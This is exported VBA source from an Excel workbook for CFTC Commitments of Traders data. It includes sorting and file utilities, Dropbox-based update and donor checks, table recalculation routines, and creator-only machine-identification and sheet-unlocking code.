                String_Array(X) = Replace(Right(String_Array(X), Len(String_Array(X)) - 1), Delimiter, Changed_Delimiter)
            
            Else 'just replace
                
                String_Array(X) = Replace(String_Array(X), Delimiter, Changed_Delimiter)
            
            End If
            
        End If
        
    Next X
    'Join the Array elements back together {Do not add another delimiter] and split with the changed Delimiter
    Change_Delimiter_Not_Between_Quotes = Split(Join(String_Array), Changed_Delimiter)
    'returns an array
End Function
Public Function IsInArray(valToBeFound As Variant, Arr As Variant) As Boolean
'DEVELOPER: Ryan Wells (wellsr.com)
'DESCRIPTION: Function to check if a value is in an array of values
'INPUT: Pass the function a value to search for and an array of values of any data type.
'OUTPUT: True if is in array, false otherwise
Dim element As Variant
On Error GoTo IsInArrayError: 'array is empty
    For Each element In Arr
        If element = valToBeFound Then
            IsInArray = True
            Exit Function
        End If
    Next element
Exit Function
IsInArrayError:
On Error GoTo 0
IsInArray = False
End Function
Public Function entUnZip1File(ByVal strZipFilename As Variant, ByVal strDstDir As Variant, ByVal strFilename As Variant) 'Opens zip file
                                                'path of file     path of Folder containing file              name of specified file within .zip file
    Const glngcCopyHereDisplayProgressBox = 256
'
  Dim intOptions, objShell, objSource, objTarget As Object
'
' Create the required Shell objects
  Set objShell = CreateObject("Shell.Application")
'
' Create a reference to the files and folders in the ZIP file
  Set objSource = objShell.Namespace(strZipFilename).Items.Item(strFilename)
'
' Create a reference to the target folder
  Set objTarget = objShell.Namespace(strDstDir)
'
  intOptions = glngcCopyHereDisplayProgressBox
'
' UnZIP the files
  objTarget.CopyHere objSource, intOptions
'
' Release the objects
  Set objSource = Nothing
  Set objTarget = Nothing
  Set objShell = Nothing
'
entUnZip1File = 1
'
End Function
Public Function Quicksort(ByRef vArray As Variant, arrLbound As Long, arrUbound As Long)
'Sorts a one-dimensional VBA array from smallest to largest
'using a very fast quicksort algorithm variant.
Dim pivotVal As Variant
Dim vSwap    As Variant
Dim tmpLow   As Long
Dim tmpHi    As Long
 
tmpLow = arrLbound
tmpHi = arrUbound
pivotVal = vArray((arrLbound + arrUbound) \ 2)
 
While (tmpLow <= tmpHi) 'divide
   While (vArray(tmpLow) < pivotVal And tmpLow < arrUbound)
      tmpLow = tmpLow + 1
   Wend
  
   While (pivotVal < vArray(tmpHi) And tmpHi > arrLbound)
      tmpHi = tmpHi - 1
   Wend
 
   If (tmpLow <= tmpHi) Then
      vSwap = vArray(tmpLow)
      vArray(tmpLow) = vArray(tmpHi)
      vArray(tmpHi) = vSwap
      tmpLow = tmpLow + 1
      tmpHi = tmpHi - 1
   End If
Wend
 
  If (arrLbound < tmpHi) Then Quicksort vArray, arrLbound, tmpHi 'conquer
  If (tmpLow < arrUbound) Then Quicksort vArray, tmpLow, arrUbound 'conquer
  
End Function
Public Function Get_File(File As String, SaveFilePathAndName As String)
Dim oStrm As Object, WinHttpReq As Object, Extension As String, File_Name As String
    
Set WinHttpReq = CreateObject("Msxml2.ServerXMLHTTP")

    WinHttpReq.Open "GET", File, False
    WinHttpReq.send
    File = WinHttpReq.responseBody
    If WinHttpReq.Status = 200 Then
    
        Set oStrm = CreateObject("ADODB.Stream")
        With oStrm
            .Open
            .Type = 1
            .Write WinHttpReq.responseBody
            .SaveToFile SaveFilePathAndName, 2 ' 1 = no overwrite, 2 = overwrite
            .Close
        End With
    End If
    
'AppleScript:
'set u to "http://download.finance.yahoo.com/d/quotes.csv?s=AAPL&f=sl1d1t1c1ohgv&e=.csv"
'do shell script "curl -L -s " & File & " > ~/desktop/quotes.csv"

End Function
Public Function Courtesy()

With Application

    If Not UUID Then
        .StatusBar = "Brought to you by MoshiM. Please consider donating to support the continued development of this project."
    Else
        .StatusBar = vbNullString
    End If
 
End With

End Function
Public Function Open_File(File_Name_And_Path) 'Open specific file

Dim WBOpen As Workbook

    Set WBOpen = Workbooks.Open(File_Name_And_Path)      'Opens the Excel file/csv

    WBOpen.Windows(1).Visible = False            'Files will not be visible

End Function
Public Function LastModified(ByRef filePath As String) As Date
    'Set a default value
    Dim KK As Object
    
    LastModified = vbNull

    If Len(Trim$(filePath)) = 0 Then Exit Function

    Set KK = CreateObject("Scripting.FileSystemObject")
    
    With KK 'CreateObject("Scripting.FileSystemObject")
    
        If .FileExists(filePath) Then LastModified = .GetFile(filePath).DateLastModified
        
    End With

End Function
Public Function GetSerialN() As Boolean

Dim FS As Object, D As Drive, My_Serial As Long, X As Long, TT As String
    
    X = FreeFile
    
    Open Environ("ONEDRIVE") & "\C.O.T Password.txt" For Binary As #X 'open text file and retrieve string
        TT = Space$(LOF(X))
        Get #X, , TT
    Close #X
    
    My_Serial = CLng(Split(TT, ",")(3))
        
On Error GoTo No_Scripting

With ThisWorkbook

    If .SerialN = 0 Then
    
        Set FS = CreateObject("Scripting.FileSystemObject")
        Set D = FS.GetDrive(FS.GetDriveName(FS.GetAbsolutePathName(drvpath)))
        
        .SerialN = D.SerialNumber
        
    End If
    
    If .SerialN = My_Serial Then GetSerialN = True
    
End With

'Select Case d.DriveType
'Case 0: t = "Unknown"
'Case 1: t = "Removable"
'Case 2: t = "Fixed"
'Case 3: t = "Network"
'Case 4: t = "CD-ROM"
'Case 5: t = "RAM Disk"
'End Select

No_Scripting:

End Function
Function MAC_B_Personal() As Boolean
 
    'Declaring the necessary variables.
    Dim strComputer     As String
    Dim objWMIService   As Object
    Dim colItems        As Object
    Dim objItem         As Object
    Dim myMACAddress    As String
    Dim X               As Byte
    'Dim jj              As Double
    Dim MacAD           As String
    
    X = FreeFile
    
 On Error GoTo Invalid_Procedure
 
    Open Environ("ONEDRIVE") & "\C.O.T Password.txt" For Binary As #X 'open text file and retrieve string
        MacAD = Space$(LOF(X))
        Get #X, , MacAD
    Close #X

    MacAD = Replace(Split(MacAD, ",")(4), vbNewLine, vbNullString)
    
    'Set the computer.
    strComputer = "."
 
    'The root\cimv2 namespace is used to access the Win32_NetworkAdapterConfiguration class.
    Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
 
    'A select query is used to get a collection of network adapters that have the property IPEnabled equal to true.
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
 
    'Loop through all the collection of adapters and return the MAC address of the first adapter that has a non-empty IP.
    For Each objItem In colItems
        If Not IsNull(objItem.IPAddress) Then myMACAddress = objItem.MACAddress
        Exit For
    Next
    'Return the IP string.

    If MacAD = myMACAddress Then MAC_B_Personal = True
        
Invalid_Procedure:
    
End Function
Public Function UUID() As Boolean

Dim Text_S As String, CMD_Output As String, X As Byte, CMD As String, MY_ID As String, Storage_File As String ', TT As Double

'TT = Timer

#If Mac Then

    Exit Function 'function always returns False if on MAC
    
#Else
    
    On Error GoTo Exit_UUID 'returns false
    
    Storage_File = Environ("ONEDRIVE") & "\C.O.T Password.txt"
    
    If Dir(Storage_File) <> vbNullString Then 'if stored password file exists
    
        With ThisWorkbook
        
            Text_S = Environ("Temp") & "\UUID_MM_CC.txt" 'Where output from command will be stored
            
            If Dir(Text_S) = vbNullString Then 'If text file doesn't exist then create it and store password
                CMD = "wmic csproduct get UUID>" 'command to be run
                CMD = "cmd /c """ & CMD & Text_S & """" 'command for input that designates output to text file
                CreateObject("wscript.shell").Run CMD, 0, True
            End If
                
            If .Unique_ID = vbNullString Then 'populate the variable using the Command Output
                X = FreeFile
                
                Open Text_S For Binary As #X 'open text file [and retrieve UUID string]
                    CMD_Output = Space$(LOF(X))
                    Get #X, , CMD_Output 'load content into variable
                Close #X
                
                For X = 1 To Len(CMD_Output) 'loop each character and store if AlphaNumeric or "-"
                    
                    Text_S = Mid(CMD_Output, X, 1) 'designate current character
                    
                    If Text_S Like "[A-Z,a-z,0-9,-]" Then .Unique_ID = .Unique_ID & Text_S 'concatenate to string
                        
                Next X
                        
                .Unique_ID = Replace(.Unique_ID, "UUID", vbNullString, 1, 1) 'remove UUID from start
            
            End If
            
            X = FreeFile
            Open Storage_File For Binary As #X 'open Stored text file and retrieve string for comparison
                MY_ID = Space$(LOF(X))
                Get #X, , MY_ID
            Close #X
            
            MY_ID = Split(MY_ID, ",")(2) '3rd item in the string
            
            If .Unique_ID = MY_ID And GetSerialN And MAC_B_Personal Then UUID = True 'compare to values in Password File
        
        End With
    
    End If

#End If
    
Exit_UUID: On Error GoTo 0
'Debug.Print "Function UUID completed in " & Timer - TT & " seconds"
End Function
Function UTC() As Date

Dim dt As Object

Set dt = CreateObject("WbemScripting.SWbemDateTime")
    
With dt
    .SetVarDate Now
    UTC = .GetVarDate(False)
End With
    'Debug.Print UTC
End Function
Function HasKey(col As Collection, Key As String) As Boolean
    Dim v As Variant
  On Error Resume Next
    v = IsObject(col.Item(Key))
    HasKey = Not IsEmpty(v)
End Function
Sub Increment_Progress(Label As MSForms.Label, New_Width As Double, Loop_Percentage As Double)
   
    Label.Width = New_Width
    
    Progress_Bar.Caption = "Completed : " & Round(Loop_Percentage * 100, 0) & " %"
    
    DoEvents
    
End Sub
Public Function CFTC_Table(Worbook_S As Workbook, Optional Sheet_Object As Worksheet, Optional Sheet_Name As String) As ListObject

Dim CFTC_TB As ListObject, HDR() As Variant

Const Locator_STR As String = "CFTC_Contract_Market_Code"      'String to be found within the Headers of a table

If Sheet_Object Is Nothing And Sheet_Name <> vbNullString Then 'in case a worbook wasn't provided but a worksheet name was

     Set Sheet_Object = Worbook_S.Worksheets(Sheet_Name)
     
End If

For Each CFTC_TB In Sheet_Object.ListObjects                    'Loop Tables on the Specified Sheet

    HDR = CFTC_TB.HeaderRowRange.Value2                          'Store headers of the table in an array
        
    If Not IsError(WorksheetFunction.Match(Locator_STR, HDR, 0)) Then 'Check if Locator_STR is found within the headers
    
        Set CFTC_Table = CFTC_TB                            'Then return the current ListObject to the Function
        
        Exit Function
    
    End If
    
Next CFTC_TB

End Function
Function IsPowerQueryAvailable() As Boolean 'Determine if Power Query is available...use for when less than EXCEL 2016
    Dim bAvailable As Boolean
    On Error Resume Next
    bAvailable = Application.COMAddIns("Microsoft.Mashup.Client.Excel").Connect
    On Error GoTo 0
    IsPowerQueryAvailable = bAvailable
    Debug.Print bAvailable
End Function
Sub Donators(Query_W As Worksheet, Target_T As Shape)

Dim URL As String, QT As QueryTable

On Error GoTo EXIT_DN_List

URL = Replace("https://www.dropbox.com/s/g75ij0agki217ow/CT%20Donators.txt?dl=0", _
        "www.dropbox.com", "dl.dropboxusercontent.com")
        
Set QT = Query_W.QueryTables.Add("TEXT;" & URL, Query_W.Range("A1"))

With QT

    .BackgroundQuery = False
    .SaveData = False
    .AdjustColumnWidth = False
    .RefreshStyle = xlOverwriteCells
    .WorkbookConnection.Name = "Misc 2"
    .Refresh False
    
    With .ResultRange
    
        Target_T.TextFrame.Characters.Text = Join(WorksheetFunction.Transpose(.Value2), vbNewLine)
        
        .ClearContents
        
    End With
    
    .Delete
    
End With

Target_T.Visible = True

Exit Sub

EXIT_DN_List:
    If Err.Number <> 0 Then Err.Clear
End Sub
Attribute VB_Name = "QueryT"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ReCalculate_Legacy"
Sub Recalculate_Workbook_Legacy()
Attribute Recalculate_Workbook_Legacy.VB_Description = "Recalculate every worksheet in the workbook."
Attribute Recalculate_Workbook_Legacy.VB_ProcData.VB_Invoke_Func = " \n14"

Dim I As Variant, DD() As Variant, TTT As Worksheet

With Application

    DD = .Index(.Run("'" & ThisWorkbook.Name & "'!Get_Worksheet_Info"), 0, 3)
    .ScreenUpdating = False
    
End With

For Each I In DD

On Error GoTo ski

    Select Case I

        Case HUB.Name, Weekly.Name, Chart_Sheet.Name, Variable_Sheet.Name, QueryT.Name
        Case Else
        
        Set TTT = ThisWorkbook.Worksheets(I)
        
        Call Recalculate_Legacy_Version(CFTC_Table(ThisWorkbook, TTT))
        
    End Select
ski:
Next I

Application.ScreenUpdating = True

End Sub
Sub Recalculate_Worksheet_Legacy()
Attribute Recalculate_Worksheet_Legacy.VB_Description = "Recalculate the active worksheet"
Attribute Recalculate_Worksheet_Legacy.VB_ProcData.VB_Invoke_Func = " \n14"

With Application

    .ScreenUpdating = False
    
        Call Recalculate_Legacy_Version(CFTC_Table(ThisWorkbook, ActiveSheet))
        
    .ScreenUpdating = True

End With

End Sub
Private Function Recalculate_Legacy_Version(TB As ListObject)

Dim Data_Array As Variant, filterArray As Variant

If Not TB Is Nothing Then

    With TB
        
        Data_Array = .DataBodyRange.Value2
        
        If UBound(Data_Array, 2) > 54 Then ReDim Preserve Data_Array(1 To UBound(Data_Array, 1), 1 To 54)
            
        ChangeFilters TB, filterArray
    
        .DataBodyRange.Value2 = Application.Run("'" & ThisWorkbook.Name & "'!Multi_Calculations", Data_Array, UBound(Data_Array, 1), _
                    Variable_Sheet.ListObjects("Saved_Variables").DataBodyRange.Cells(2, 2).Value2, 156, 26, True)
    
        RestoreFilters .DataBodyRange, filterArray
    
    End With

End If

End Function
Private Sub ChangeFilters(W As ListObject, ByRef filterArray)

With W.AutoFilter

    With .Filters
        ReDim filterArray(1 To .count, 1 To 3)
        For F = 1 To .count
            With .Item(F)
                If .On Then
                    filterArray(F, 1) = .Criteria1
                    If .Operator Then
                        filterArray(F, 2) = .Operator
                        filterArray(F, 3) = .Criteria2
                    End If
                End If
            End With
        Next
    End With
    
    .ShowAllData
    
End With

End Sub
Private Sub RestoreFilters(W As Range, ByVal filterArray)

Dim col As Long

With W

    For col = 1 To UBound(filterArray, 1)
    
        If Not IsEmpty(filterArray(col, 1)) Then
            If filterArray(col, 2) Then
                .AutoFilter Field:=col, _
                    Criteria1:=filterArray(col, 1), _
                        Operator:=filterArray(col, 2), _
                    Criteria2:=filterArray(col, 3)
            Else
                .AutoFilter Field:=col, _
                    Criteria1:=filterArray(col, 1)
            End If
            
        End If
        
    Next

End With

End Sub



Attribute VB_Name = "Release_Schedule_F"
Attribute VB_Base = "0{842CEEC4-E58B-4B28-BE2F-74FE7B306BEE}{0B1868A4-534E-4157-B241-19B1F5D434DC}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit
Private Sub UserForm_Initialize()
Dim Data As Variant, Body As String, X As Long, Y As Long, TB As String

Data = Variable_Sheet.ListObjects("Release_Schedule").Range.Value2 'Range

For X = 1 To UBound(Data, 1)

    If Not IsError(Application.Match(X, Array(1, 5, 6, 7, 8), 0)) Then  'Array(3, 6, 9)
        TB = Chr(9) & Chr(9)
    ElseIf Not IsError(Application.Match(X, Array(2, 3, 4, 9, 10, 11, 12, 13), 0)) Then
        TB = Chr(9) '& Chr(9) '& Chr(9),
    Else
        TB = Chr(9) & Chr(9) & Chr(9)
    End If
    
    Body = Body & " " & Data(X, 1) & TB
    
    For Y = 2 To UBound(Data, 2)
        
        Body = Body & Data(X, Y) & Chr(9)
        
    Next Y
    
    Body = Body & vbNewLine

Next X
'Debug.Print Body
Me.TT.Caption = Body
'Unload Me
End Sub


Attribute VB_Name = "Save_"
'Private Declare PtrSafe Function FindWindow Lib "user32.dll" _
'Alias "FindWindowA" _
'(ByVal lpClassName As String, ByVal lpWindowName As String) As Long
'
'Private Declare PtrSafe Function ShowWindow Lib "user32.dll" _
'(ByVal hwnd As Long, ByVal nCmdShow As Long) As Long

'Private Sub CloseVBEWindow()
'    Dim hwnd As Long
'
'    hwnd = FindWindow("wndclass_desked_gsk", vbNullString)
'
'    If hwnd <> 0 Then ShowWindow hwnd, False
'
'End Sub
Public Schedule_Time As Date
Private Sub Run_These_Key_Binds()

Dim Key_Bind() As String, Procedure() As String, X As Long

Key_Bind = Split("^b,^+b,^s,^+c,^w", ",")

Procedure = Split("ToTheHub,To_Charts,Custom_Save,Navigation_Userform,Close_WB", ",")

With Application
    For X = 0 To UBound(Key_Bind)
        .OnKey Key_Bind(X), "'" & ThisWorkbook.Name & "'!" & Procedure(X)
    Next X
End With

End Sub
Private Sub Remove_Key_Binds()

Dim Key_Bind() As String, X As Long

Key_Bind = Split("^b,^+b,^s,^+c,^w", ",")

With Application
    For X = 0 To UBound(Key_Bind)
        .OnKey Key_Bind(X)
    Next X
End With

End Sub
Sub Custom_Save()
Attribute Custom_Save.VB_Description = "CTRL+S : Save without warnings from the document inspector."
Attribute Custom_Save.VB_ProcData.VB_Invoke_Func = "s\n14"

Call Re_Enable

    With ThisWorkbook
    
        Application.ScreenUpdating = False
        
        If UUID Then
        
            Set .Last_Used_Sheet = .ActiveSheet
            Application.Run "'" & .Name & "'!Remove_Images"
            If Not ThisWorkbook.ActiveSheet Is HUB Then HUB.Activate
    
        End If
    
        Application.DisplayAlerts = False: .RemovePersonalInformation = True
         .Save
        Application.DisplayAlerts = True
     
    End With
    
End Sub
Private Sub Remove_Images() 'this sub is only run if on creator computer(screen updating previously turned off

Dim Animu As Variant, Wall_Path As String, X As Long, Worsheet_Array As Variant, T As Long

If Not UUID Then Exit Sub

Wall_Path = Environ("USERPROFILE") & "\Desktop\Wallpapers\"
    
If HUB.ProtectContents = True Then Worksheet_Protection_Toggle HUB  'relock hub

Worsheet_Array = Array(HUB, Variable_Sheet)
    
For X = 0 To 1
  
    For Each Animu In Worsheet_Array(X).Shapes
    
        With Animu
            
            Select Case .Name
            
                Case "Macro_Check"
                
                Case "Object_Group"
                    
                    For T = 1 To .GroupItems.count 'make everything visible
                        
                        With .GroupItems(T)
                        
                            Select Case .Name
                            
                                Case "DN_List"

                                    .Visible = False
                                
                                Case Else
                                
                                    .Visible = True 'if the name=unlock_p
                                    
                            End Select
                            
                        End With
                        
                    Next T
                    
                Case Else
                
                    .Visible = False
                    
            End Select
            
        End With
        
    Next Animu

Next X

On Error GoTo No_Wallpapers

With Variable_Sheet

    Animu = .ListObjects("Wallpaper_Selection").DataBodyRange.Columns(2).Value2
            .Visible = xlSheetVeryHidden
            .SetBackgroundPicture Filename:=vbNullString
    
End With

Worsheet_Array = Array(HUB, Weekly)

For X = 0 To 1

    Worsheet_Array(X).SetBackgroundPicture Filename:=Wall_Path & Animu(X + 3, 1)

Next X
    
Worksheet_Protection_Toggle HUB  'relock hub

Exit Sub
No_Wallpapers:
    MsgBox "1 or more wallpapers or images are unavailable in the Remove_Images SUB()"
End Sub
Private Sub My_NSFW()

Dim Animu As Variant, Wall_Path As String, Worsheet_Array As Variant, X As Long, T As Long, Toggle_Unlock_Project As Long

If Not UUID Then Exit Sub

Wall_Path = Environ("USERPROFILE") & "\Desktop\Wallpapers\"

With HUB

    If .ProtectContents = True Then Worksheet_Protection_Toggle HUB  'relock hub
    
    If Variable_Sheet.ListObjects("Saved_Variables"). _
        DataBodyRange.Find("Unlock_Project_Toggle", LookIn:=xlValues, LookAt:=xlWhole).Offset(0, 1).Value2 = 0 Then _
            .Shapes("Unlock_P").Visible = True
    
End With

Worsheet_Array = Array(HUB, Variable_Sheet)
 
 For X = 0 To 1
 
    For Each Animu In Worsheet_Array(X).Shapes
    
        With Animu
    
            Select Case .Name
                
                Case "Macro_Check"
                
                Case "Object_Group"
                    
                    For T = 1 To .GroupItems.count 'make everything but Email visible
                        
                        With .GroupItems(T)
                        
                            Select Case .Name
                            
                                Case "Feedback", "DN_List"
                                
                                    .Visible = False 'if not email
                                    
                                Case Else
                                
                                    .Visible = True
                                    
                            End Select
                            
                        End With
                        
                    Next T
    
                Case "Macros", "Patch"
                
                    .Visible = True
                    
                Case Else
                
                    '.Visible = True
                    
            End Select
        
        End With
                
    Next Animu
    
Next X

On Error GoTo No_Wallpapers_NSFW
    'replace background images"
With Variable_Sheet
    
    Animu = .ListObjects("Wallpaper_Selection").DataBodyRange.Columns(2).Value2

    .SetBackgroundPicture Filename:=Wall_Path & Animu(5, 1)
    .Visible = xlSheetVisible

End With

Worsheet_Array = Array(HUB, Weekly)

For X = 0 To 1

    Worsheet_Array(X).SetBackgroundPicture Filename:=Wall_Path & Animu(X + 1, 1)
    
Next X

Worksheet_Protection_Toggle HUB  'relock hub

Exit Sub

No_Wallpapers_NSFW:
    MsgBox "1 or more wallpapers or images are unavailable in the NSFW SUB()"
End Sub
Private Sub Worksheet_Protection_Toggle(Optional This_Sheet As Worksheet)

Dim Sheet_Pass As String, filenumber As Long, Path As String

On Error GoTo 0

If UUID Then
        
    If This_Sheet Is Nothing Then Set This_Sheet = HUB
        
    With ThisWorkbook
        
        If .Procedure_Active = False And .ActiveSheet Is HUB And ActiveWorkbook Is ThisWorkbook Then _
        HUB.Shapes("My_Date").TopLeftCell.Offset(1, 0).Select
        
        On Error GoTo No_File_FOUND
        
        If .Password_M = vbNullString Then
            Path = Environ("ONEDRIVE") & "\C.O.T Password.txt" 'path of file containing password
            
            filenumber = FreeFile
            Open Path For Input As #filenumber                 'open text file and load delmited string to variable
                .Password_M = Input(LOF(filenumber), #filenumber)
                .Password_M = Split(.Password_M, Chr(44))(0)   'password will be first item in the string
            Close #filenumber
            
        End If
    
    End With
    
    On Error GoTo Error_While_Locking

    With This_Sheet

        If .ProtectContents = True Then 'If the worksheet is protected
        
            .Unprotect ThisWorkbook.Password_M
            
            If This_Sheet Is HUB Then .Shapes("My_Date").Fill.ForeColor.RGB = RGB(88, 143, 33)
            
        Else 'If worksheet is not protected
                
             If This_Sheet Is HUB Then .Shapes("My_Date").Fill.ForeColor.RGB = RGB(150, 12, 12)
             
            .Protect ThisWorkbook.Password_M, True, True, True, False, True, True, True, False, False, True, False, False, True, True, True
             
        End If
    
    End With

End If
    
Exit Sub

Error_While_Locking:

    MsgBox This_Sheet.Name & " could not be locked"
    Exit Sub

No_File_FOUND:
    MsgBox "Password File not found in OneDrive folder. Worksheets were not locked. If Password has been forgotten check DropBox or Onedrive."
End Sub
Sub Close_WB()
Attribute Close_WB.VB_Description = "CTRL+W : Close current Workbook. Intended for Creator Use."
Attribute Close_WB.VB_ProcData.VB_Invoke_Func = "w\n14"

Re_Enable
Remove_Key_Binds

With ThisWorkbook
    
    If UUID And .Saved = False Then
        
        If Not .ActiveSheet Is HUB Then HUB.Activate
    
        Set .Last_Used_Sheet = HUB 'doing this tells the program that the file has already run the remove_images macro
    
        Application.Run "'" & .Name & "'!Remove_Images"
    
    End If
    
    .Close

End With

End Sub
Private Function Update_Date() As Boolean

Dim Path As String, Update As Double, DD As Byte, WinHttpReq As Object, FileN As String, Update_Range As Range, _
URL As String, HTML As Object, STR_AR() As String, X As Byte, File_Type As String

Set Update_Range = Variable_Sheet.ListObjects("Saved_Variables"). _
    DataBodyRange.Find("Update", LookIn:=xlValues, LookAt:=xlWhole).Offset(0, 1)
    
File_Type = Update_Range.Offset(1, 0).Value2

FileN = "Date_Check.txt"

X = Application.Match(File_Type, Array("L", "D", "T"), 0) - 1

If Not ThisWorkbook.Last_Used_Sheet Is Nothing And UUID Then 'Update Dates if ME

    Path = Environ("ONEDRIVE") & "\Futures and Options Combined\" & FileN
    
    DD = FreeFile: Update = Now
    
    Open Path For Input As #DD

        FileN = Input(LOF(DD), #DD)

    Close #DD

    STR_AR() = Split(FileN, ","): STR_AR(X) = Update

    Open Path For Output As #DD

        Print #DD, Join(STR_AR, ",")

    Close #DD

    Update_Range.Value2 = Update 'I'm the one who updates the variable

Else 'compare dates
    
    On Error GoTo Date_Check_Error
    
    URL = Replace("https://www.dropbox.com/s/78l4v2gp99ggp1g/Date_Check.txt?dl=0", _
        "www.dropbox.com", "dl.dropboxusercontent.com")
        
    Set HTML = CreateObject("htmlFile")
    
    Set WinHttpReq = CreateObject("MSXML2.XMLHTTP")
        
    With WinHttpReq
    
        .Open "GET", URL, False 'File is a URL/web page: False means that it has to make the connection before moving on
        .send         'File is the URL of the file or webpage

        HTML.Body.innerHTML = .responseText
    
    End With
    
    If Round(Update_Range.Value2, 10) < Round(Split(HTML.Body.FirstChild.Data, ",")(X), 10) Then Update_Date = True
    'Array elements in order [L,D,T]

End If

Exit Function

No_Query:

    MsgBox "Check for workbook update failed" & vbNewLine & _
    "User is on MAC and Power Query isn't installed or an internet connection is unavailable." & _
    " Please download Power Query if it is available to your version of excel."
    
    On Error Resume Next
    
    With ThisWorkbook
        Application.OnTime .Run_When, "'" & .Name & "'!Update_Check", , False
    End With
    
    Exit Function
    
Date_Check_Error:

    MsgBox "Something went wrong while checking for Workbook Function/Macro Updates" & vbNewLine & _
    "Please notify me via the Email macro on the HUB or contact me at MoshiM_UC@outlook.com"
    
End Function
Private Sub Update_Check()
    
With ThisWorkbook
    
    .Run_When = Now + TimeSerial(0, 10, 0) 'every 10 minutes
    
    Application.OnTime .Run_When, "'" & .Name & "'!Update_Check"
    
    #If Mac Then
    
        If MAC_Creator_Update_Check = True Then Update_File.Show
    
    #Else
        
        If Update_Date = True Then Update_File.Show
   
   #End If
    
End With

End Sub
Private Sub Unlock_Project()

Dim G As Long, Path As String, RR As Range, WshShell As Object

Set RR = Variable_Sheet.ListObjects("Saved_Variables").DataBodyRange. _
        Find("Unlock_Project_Toggle", LookIn:=xlValues, LookAt:=xlWhole).Offset(0, 1)

#If Mac Then

#Else

    If UUID And RR.Value2 = 0 Then
        
        Set WshShell = CreateObject("WScript.Shell")
        
        With ThisWorkbook
            If .Password_M = vbNullString Then
                G = FreeFile
                Path = Environ("ONEDRIVE") & "\C.O.T Password.txt"
                Open Path For Input As #G
                    .Password_M = Input(LOF(G), #G)
                    .Password_M = Split(.Password_M, Chr(44))(0)
                Close #G
            End If
        End With
    
        With WshShell
        
            .SendKeys "%l", True                       'ALT L   Developer Tab
            
            .SendKeys "c", True                        'C       View Code for worksheet
            
            .SendKeys ThisWorkbook.Password_M, True    'Supply  Password
            
            .SendKeys "{ENTER}", True                  'Submit
            
            ThisWorkbook.VBProject.VBE.MainWindow.Visible = False 'Close Editor
            
        End With
        
        RR.Value2 = 1
    Else
        ThisWorkbook.VBProject.VBE.MainWindow.Visible = True
    End If

#End If

End Sub
Private Function MAC_Creator_Update_Check() As Boolean

Dim QT As QueryTable, URL As String, X As Long, Update_Range As Range, File_Type As String

Set Update_Range = Variable_Sheet.ListObjects("Saved_Variables"). _
    DataBodyRange.Find("Update", LookIn:=xlValues, LookAt:=xlWhole).Offset(0, 1) 'DOC Type RANGE
    
File_Type = Update_Range.Offset(1, 0).Value2 'DOC TYPE L,D,T

X = Application.Match(File_Type, Array("L", "D", "T"), 0) - 1

URL = Replace("https://www.dropbox.com/s/78l4v2gp99ggp1g/Date_Check.txt?dl=0", _
        "www.dropbox.com", "dl.dropboxusercontent.com")
    
On Error GoTo Exit_MAC_DATA_CHECK

Set QT = QueryT.QueryTables.Add("TEXT;" & URL, Destination:=QueryT.Range("A1"))

With QT

    .RefreshStyle = xlOverwriteCells
    .BackgroundQuery = False
    .Name = "MAC_Creator_Update_Check"
    .WorkbookConnection.Name = "Checking for Creator Updates {MAC}"
    .AdjustColumnWidth = False
    .SaveData = False
    .Refresh False
    
    With .ResultRange
        
        If Round(Update_Range.Value2, 10) < Round(Split(.Cells(1, 1).Value2, Chr(44))(X), 10) _
        Then MAC_Creator_Update_Check = True
        
        .ClearContents
        
    End With
    
    .Delete
    
End With
    
Set QT = Nothing

Exit Function
    
Exit_MAC_DATA_CHECK:

    With ThisWorkbook
        Application.OnTime .Run_When, "'" & .Name & "'!Update_Check", , False
    End With
    
End Function
Attribute VB_Name = "Sheet101"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet103"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet105"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet106"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet109"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet110"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet111"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet114"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
